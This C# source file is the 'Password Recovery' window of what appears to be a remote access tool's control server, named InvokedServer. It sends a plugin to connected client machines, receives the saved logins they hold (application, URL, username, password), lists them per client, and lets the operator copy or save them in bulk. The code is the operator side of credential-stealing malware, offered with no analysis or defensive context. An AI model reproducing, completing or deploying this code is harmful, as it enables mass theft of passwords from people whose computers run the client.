

using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedServer.Enums;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;


namespace InvokedServer.Forms
{
	public partial class FrmPasswordRecovery : Form
	{
		private bool DidLoadPlugin;
		private readonly Client[] _clients;
		private readonly PasswordRecoveryHandler _recoveryHandler;
		private readonly RecoveredAccount _noResultsFound = new RecoveredAccount()
		{
			Application = "No Results Found",
			Url = "N/A",
			Username = "N/A",
			Password = "N/A"
		};

		public FrmPasswordRecovery(Client[] clients)
		{
			this._clients = clients;
			this._recoveryHandler = new PasswordRecoveryHandler(clients);
			this.RegisterMessageHandler();
			this.InitializeComponent();
		}

		private void RegisterMessageHandler()
		{
			this._recoveryHandler.AccountsRecovered += new PasswordRecoveryHandler.AccountsRecoveredEventHandler(this.AddPasswords);
			this._recoveryHandler.PluginStatusChanged += new PasswordRecoveryHandler.PluginStatusEventHandler(this.PluginStatusChanged);
			MessageHandler.Register((IMessageProcessor)this._recoveryHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._recoveryHandler);
			this._recoveryHandler.AccountsRecovered -= new PasswordRecoveryHandler.AccountsRecoveredEventHandler(this.AddPasswords);
			this._recoveryHandler.PluginStatusChanged -= new PasswordRecoveryHandler.PluginStatusEventHandler(this.PluginStatusChanged);
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Invoke(new MethodInvoker(((Form)this).Close));
		}

		private void PluginStatusChanged(object sender, PluginStatus status)
		{
			switch (status)
			{
				case PluginStatus.Loaded:
					this.PluginLabel.ForeColor = Color.LightGreen;
					this.PluginLabel.Text = "Plugin is ready!";
					if (!this.DidLoadPlugin)
					{
						this.PluginLabel.Visible = false;
						break;
					}
					break;
				case PluginStatus.Installing:
					this.PluginLabel.ForeColor = Color.DeepSkyBlue;
					this.PluginLabel.Text = "Sending the Plugin for the first time, please wait..";
					this.DidLoadPlugin = true;
					break;
				case PluginStatus.PluginFileNotFound:
					this.PluginLabel.ForeColor = Color.Red;
					this.PluginLabel.Text = "Error: Cannot find the Plugin dll in Plugins folder!";
					break;
			}
			this.OnResize(EventArgs.Empty);
		}

		private void FrmPasswordRecovery_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle("Password Recovery", this._clients.Length);
			this.txtFormat.Text = InvokedServer.Models.Settings.SaveFormat;
			this.OnResize(EventArgs.Empty);
			this.clearAllToolStripMenuItem_Click((object)null, (EventArgs)null);
			this._recoveryHandler.CheckPluginStatus();
		}

		private void FrmPasswordRecovery_FormClosing(object sender, FormClosingEventArgs e)
		{
			InvokedServer.Models.Settings.SaveFormat = this.txtFormat.Text;
			this.UnregisterMessageHandler();
		}

		private void FrmPasswordRecovery_Resize(object sender, EventArgs e)
		{
			if (this.WindowState == FormWindowState.Minimized)
				return;
			this.PluginLabel.Left = (this.Width - this.PluginLabel.Width) / 2;
		}

		private void RecoverPasswords()
		{
			this.clearAllToolStripMenuItem_Click((object)null, (EventArgs)null);
			this._recoveryHandler.BeginAccountRecovery();
		}

		private void AddPasswords(
		  object sender,
		  string clientIdentifier,
		  List<RecoveredAccount> accounts)
		{
			this.PluginLabel.Visible = false;
			try
			{
				if (accounts == null || accounts.Count == 0)
				{
					ListViewItem listViewItem = new ListViewItem()
					{
						Tag = (object)this._noResultsFound,
						Text = clientIdentifier
					};
					listViewItem.SubItems.Add(this._noResultsFound.Url);
					listViewItem.SubItems.Add(this._noResultsFound.Username);
					listViewItem.SubItems.Add(this._noResultsFound.Password);
					ListViewGroup listViewGroup = this.GetGroupFromApplication(this._noResultsFound.Application);
					if (listViewGroup == null)
						listViewGroup = new ListViewGroup()
						{
							Name = this._noResultsFound.Application,
							Header = this._noResultsFound.Application
						};
					listViewItem.Group = listViewGroup;
					this.lstPasswords.Items.Add(listViewItem);
				}
				else
				{
					List<ListViewItem> listViewItemList = new List<ListViewItem>();
					foreach (RecoveredAccount account in accounts)
					{
						ListViewItem listViewItem = new ListViewItem()
						{
							Tag = (object)account,
							Text = clientIdentifier
						};
						listViewItem.SubItems.Add(account.Url);
						listViewItem.SubItems.Add(account.Username);
						listViewItem.SubItems.Add(account.Password);
						ListViewGroup group = this.GetGroupFromApplication(account.Application);
						if (group == null)
						{
							group = new ListViewGroup()
							{
								Name = account.Application.Replace(" ", string.Empty),
								Header = account.Application
							};
							this.lstPasswords.Groups.Add(group);
						}
						listViewItem.Group = group;
						listViewItemList.Add(listViewItem);
					}
					this.lstPasswords.Items.AddRange(listViewItemList.ToArray());
					this.UpdateRecoveryCount();
				}
			}
			catch
			{
			}
		}

		private void UpdateRecoveryCount()
		{
			this.groupBox1.Text = string.Format("Recovered Accounts [ {0} ]", (object)this.lstPasswords.Items.Count);
		}

		private string ConvertToFormat(string format, RecoveredAccount login)
		{
			return format.Replace("APP", login.Application).Replace("URL", login.Url).Replace("USER", login.Username).Replace("PASS", login.Password);
		}

		private StringBuilder GetLoginData(bool selected = false)
		{
			StringBuilder loginData = new StringBuilder();
			string text = this.txtFormat.Text;
			if (selected)
			{
				foreach (ListViewItem selectedItem in this.lstPasswords.SelectedItems)
					loginData.Append(this.ConvertToFormat(text, (RecoveredAccount)selectedItem.Tag) + "\n");
			}
			else
			{
				foreach (ListViewItem listViewItem in this.lstPasswords.Items)
					loginData.Append(this.ConvertToFormat(text, (RecoveredAccount)listViewItem.Tag) + "\n");
			}
			return loginData;
		}

		private ListViewGroup GetGroupFromApplication(string app)
		{
			ListViewGroup groupFromApplication = (ListViewGroup)null;
			foreach (ListViewGroup listViewGroup in this.lstPasswords.Groups.Cast<ListViewGroup>().Where<ListViewGroup>((Func<ListViewGroup, bool>)(group => group.Header == app)))
				groupFromApplication = listViewGroup;
			return groupFromApplication;
		}

		private void saveAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			StringBuilder loginData = this.GetLoginData();
			using (SaveFileDialog saveFileDialog = new SaveFileDialog())
			{
				if (saveFileDialog.ShowDialog() != DialogResult.OK)
					return;
				File.WriteAllText(saveFileDialog.FileName, loginData.ToString());
			}
		}

		private void saveSelectedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			StringBuilder loginData = this.GetLoginData(true);
			using (SaveFileDialog saveFileDialog = new SaveFileDialog())
			{
				if (saveFileDialog.ShowDialog() != DialogResult.OK)
					return;
				File.WriteAllText(saveFileDialog.FileName, loginData.ToString());
			}
		}

		private void copyAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ClipboardHelper.SetClipboardTextSafe(this.GetLoginData().ToString());
		}

		private void copySelectedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ClipboardHelper.SetClipboardTextSafe(this.GetLoginData(true).ToString());
		}

		private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.RecoverPasswords();
		}

		private void clearAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.lstPasswords.Items.Clear();
			this.lstPasswords.Groups.Clear();
			this.UpdateRecoveryCount();
		}

		private void clearSelectedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			for (int index = 0; index < this.lstPasswords.SelectedItems.Count; ++index)
				this.lstPasswords.Items.Remove(this.lstPasswords.SelectedItems[index]);
		}
	}
}